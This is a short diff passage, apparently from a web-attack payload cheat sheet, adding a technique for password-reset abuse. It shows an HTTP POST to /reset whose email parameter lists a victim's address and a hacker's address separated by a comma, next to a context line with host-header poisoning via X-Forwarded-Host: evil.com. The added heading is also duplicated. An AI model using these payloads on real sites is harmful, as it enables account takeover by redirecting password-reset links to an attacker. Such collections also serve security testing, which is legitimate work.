@@ -377,3 +377,13 @@ X-Forwarded-Host: evil.com
 
 email=victim@mail.com
 ...
+Using separator in value of the parameter
+
+3. Using separator in value of the parameter
+```bash
+POST /reset HTTP/1.1
+Host: target.com
+...
+
+email=victim@mail.com,hacker@mail.com
+...
